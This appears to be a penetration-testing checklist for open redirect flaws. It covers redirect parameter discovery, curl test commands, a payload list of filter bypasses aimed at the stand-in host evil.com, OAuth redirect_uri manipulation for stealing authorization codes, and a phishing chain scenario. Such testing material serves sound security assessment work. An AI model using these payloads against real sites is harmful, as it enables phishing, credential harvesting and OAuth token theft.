# Open Redirect Testing

## Objective

Identify redirect and forward parameters that can be controlled by an attacker to redirect users to external malicious URLs — enabling phishing, OAuth token theft, and credential harvesting.

---

## 1. Identify Redirect Parameters

Look for parameters that control navigation after an action:

| Common Parameter Names |
|---|
| `?redirect=`, `?redirect_url=`, `?redirectTo=` |
| `?next=`, `?returnUrl=`, `?return=`, `?returnTo=` |
| `?url=`, `?goto=`, `?dest=`, `?destination=` |
| `?target=`, `?redir=`, `?r=`, `?continue=` |
| `?forward=`, `?forwardUrl=`, `?callback=` |
| OAuth: `redirect_uri=` |

```bash
# Search response/HTML for redirect params
curl -s https://target/ | grep -oEi '(redirect|next|return|goto|url|dest)[A-Za-z_-]*=[^&"'\'' ]+' | sort -u
```

---

## 2. Basic Open Redirect Test

```bash
# Replace [PARAM] with discovered redirect parameter name
PARAM="next"

# Basic external redirect
curl -siL "https://target/login?$PARAM=https://evil.com" | grep -iE "location:|evil.com"

# Observe:
# 1. Does the response redirect to https://evil.com?
# 2. What is the Location: header?
```

---

## 3. Filter Bypass Techniques

If the application validates the redirect URL:

### 3.1 Protocol Bypass
```
https://evil.com
//evil.com            (protocol-relative)
https:evil.com        (missing //)
https://target.com@evil.com   (@ bypass)
https://evil.com/https://target.com  (double redirect)
```

### 3.2 Domain Confusion
```
https://target.com.evil.com    (subdomain impersonation)
https://targetcom.evil.com     (typosquat)
https://evil.com/target.com    (path)
https://evil.com?target.com    (query)
https://evil.com#target.com    (fragment)
```

### 3.3 URL Encoding Bypass
```bash
# URL encode the external domain
ENCODED="https%3A%2F%2Fevil.com"
curl -siL "https://target/login?next=$ENCODED" | grep -iE "location:|evil.com"

# Double encode
ENCODED2="https%253A%252F%252Fevil.com"
curl -siL "https://target/login?next=$ENCODED2" | grep -iE "location:|evil.com"
```

### 3.4 Backslash Bypass
```
https://evil.com\@target.com
https://target.com\..evil.com
/\evil.com
//\evil.com
```

### 3.5 Unicode Bypass
```
https://evil。com    (Unicode period)
https://evil%E3%80%82com
```

---

## 4. Open Redirect Test URLs — Quick Checklist

```bash
TARGET="https://target.com"
REDIRECT_PARAM="next"

PAYLOADS=(
  "https://evil.com"
  "//evil.com"
  "/\\evil.com"
  "https://target.com@evil.com"
  "https://evil.com/https://target.com"
  "https%3A%2F%2Fevil.com"
  "/%09/evil.com"
  "/%2F%2Fevil.com"
  "https://evil.com%2F%2Etarget.com"
)

for PAYLOAD in "${PAYLOADS[@]}"; do
  RESP=$(curl -si "$TARGET/login?$REDIRECT_PARAM=$PAYLOAD" | grep -i "location:")
  echo "Payload: $PAYLOAD → $RESP"
  sleep 0.3
done
```

---

## 5. OAuth redirect_uri Manipulation

Open redirect in OAuth `redirect_uri` can lead to authorization code/token theft:

```bash
# Normal: redirect_uri=https://app.target.com/callback
# Attack: redirect_uri=https://evil.com
curl -si "https://target/oauth/authorize?client_id=APP_CLIENT_ID&redirect_uri=https://evil.com&response_type=code&state=123" \
  | grep -iE "location:|redirect_uri|error"

# Partial URI match bypass
curl -si "https://target/oauth/authorize?client_id=APP_CLIENT_ID&redirect_uri=https://app.target.com.evil.com/callback&response_type=code" \
  | grep -i location

# Path traversal on redirect_uri
curl -si "https://target/oauth/authorize?client_id=APP_CLIENT_ID&redirect_uri=https://app.target.com/callback/../../../evil&response_type=code" \
  | grep -i location
```

---

## 6. Post-Login Redirect Chain Attack

Some open redirects only work when chained with the login flow:

1. Attacker crafts: `https://target/login?next=https://evil.com`
2. Sends this URL to victim via phishing email
3. Victim logs in on the legitimate target site
4. Application redirects to `https://evil.com` after login
5. Attacker page mimics target login page: "Session expired, please re-enter credentials"

---

## Evidence to Capture

- The vulnerable endpoint and parameter name
- The payload used
- HTTP response showing `Location: https://evil.com` (redirect to external domain)
- Browser screenshot showing redirect to external site

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| Basic open redirect to external URL | Pass/Fail | Medium |
| OAuth redirect_uri → external domain | Pass/Fail | High |
| Filter bypass (encoding/protocol) | Pass/Fail | Medium-High |
| Open redirect in auth flow (phishing chain) | Pass/Fail | High |
